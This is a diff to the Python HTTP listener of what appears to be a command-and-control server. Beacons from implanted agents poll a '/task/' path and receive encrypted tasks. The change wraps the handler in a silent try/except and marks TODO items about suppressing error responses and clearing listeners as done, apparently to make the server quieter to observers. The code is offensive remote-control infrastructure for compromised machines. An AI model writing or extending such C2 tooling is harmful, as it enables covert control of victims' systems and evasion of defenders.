@@ -9,8 +9,8 @@ from time import sleep
 
 ''' 
 TO DO: 
-1- Response handling should not return a callback/error message but should act silent instead
-2- Listeners should be cleared afetr reboot
+1- Response handling should not return a callback/error message but should act silent instead (done)
+2- Listeners should be cleared afetr reboot (done)
 '''
 
 
@@ -46,21 +46,24 @@ class Listener(BaseHTTPRequestHandler):
 
         elif self.path.startswith('/task/') == True and len(os.path.split(self.path)) == 2:
             
-            agentID = os.path.split(self.path)[1]
-            task = checkTask(agentID)
-            listenerID = getAgentListener(agentID)
-            self.resetTimer(agentID)
-            self.send_response(200)
-            self.end_headers()
-            if(task):
-                # ---------------------------------------------------------
-                cipher = encrypt(listenerID, task)
-                self.wfile.write(bytes(cipher, 'utf-8'))
-                # ---------------------------------------------------------
-            else:
-                self.wfile.write(bytes('', 'utf-8'))
-                # No task available, shush the beacon
-            
+            try:
+                agentID = os.path.split(self.path)[1]
+                task = checkTask(agentID)
+                listenerID = getAgentListener(agentID)
+                self.resetTimer(agentID)
+                self.send_response(200)
+                self.end_headers()
+                if(task):
+                    # ---------------------------------------------------------
+                    cipher = encrypt(listenerID, task)
+                    self.wfile.write(bytes(cipher, 'utf-8'))
+                    # ---------------------------------------------------------
+                else:
+                    self.wfile.write(bytes('', 'utf-8'))
+                    # No task available, shush the beacon
+            except: 
+                pass 
+
     def do_POST(self):
         if self.path.startswith('/task/results/') == True and len(os.path.split(self.path)) == 2:
             try:
